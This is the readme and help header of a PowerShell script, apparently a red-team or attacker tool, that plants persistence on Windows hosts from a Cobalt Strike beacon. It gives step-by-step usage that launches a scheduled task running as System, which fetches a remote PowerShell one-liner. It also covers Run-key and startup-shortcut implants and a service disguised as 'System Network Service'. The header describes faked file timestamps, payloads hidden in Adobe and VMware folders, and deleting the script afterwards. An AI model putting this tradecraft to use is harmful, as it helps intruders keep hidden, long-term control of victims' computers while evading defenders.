persistence.ps1 Readme and Howto

	1) Create a Windows Service Executable attack package executable file in Cobalt Strike for the service.
	2) Create a Windows Executable attack package executable file in Cobalt Strike for the shortcuts, and the run keys. (can be the same exe or 2 different ones)
	2) Host the powershell one-liner attack in Cobalt Strike to be used in the scheduled task and note the path.
	3) From a beacon (elevated privs works best), 
		a. Upload the script and the exe files to somewhere inconspicuous
		b. in the same directory as the files you uploaded, use the following command, substituting the path and files
			shell powershell.exe -exec bypass c:\FULLPATHTOSCRIPT\persistence.ps1  -Shortcut short.exe -Run run.exe -Service service.exe -Schtask "http://1.1.1.1/a"
	4) You will then need to delete the script you uploaded.

<#
    .SYNOPSIS
        This script will configure one to four types of peristence on a computer: scheduled task, shortcut in start menu, RUN registry keys, and a service that autostarts.
    
    .DESCRIPTION
        The script takes parameters that determine which peristence mechanisms you want to use and the binary files to use.

    .EXAMPLE
        ./persistence.ps1 -Shortcut short.exe -Run run.exe -Service service.exe -Schtask "http://1.1.1.1/a"

    .PARAMETER Shortcut 
        File to use for the shortcut link. File will be saved to c:\programdata\adobe\reader\ and the link will be placed in 
		C:\programdata\microsoft\windows\start menu\programs\startup\ and C:\users\username\appdata\roaming\microsoft\windows\start menu\programs\startup\.
        The file's timestamps will be altered to 3 years from today plus a random number of days between 1 and 100.
    
     .PARAMETER Run
        File to use for the run keys. File will be saved to C:\programdata\VMware\ and C:\users\username\appdata\roaming\VMware\.
        The file's timestamps will be altered to 3 years from today plus a random number of days between 1 and 100.
        Run keys in HKLM:\Software\wow6432node\microsoft\windows\currentversion\run\, HKLM:\Software\microsoft\windows\currentversion\run\,
        and HKCU:\Software\microsoft\windows\currentversion\run\, HKCU:\Software\wow6432node\microsoft\windows\currentversion\run\
    
     .PARAMETER Service
        File to use for the service that will be created. Should be created as a service binary in Cobalt Strike payload generator.
        The file will be saved as C:\Windows\System32\netsrvc.exe and will not be viewable in explorer.
        The file's timestamps will be altered to 3 years from today plus a random number of days between 1 and 100.
        The new service will be set to automatic, named "System Network Service", and started. Once started, it runs and then stops but will run on startup.
    
     .PARAMETER Schtask
        URL to the powershell one liner hosted by a Cobalt Strike server. URL is used in a scheduled task that runs on startup by System.

    .NOTES
        NAME: persistence.ps1
        AUTHOR: Jennifer Gates 
        VERSION: 1.2
        LASTEDIT: 15 May 2016
        CHANGELOG:
            1.0 (14 May 2016) - Initial script.
            1.01 (15 May 2016) - minor command fixes
            1.2 (15 May 2016) - added clean up of files and changing of time stamps

#>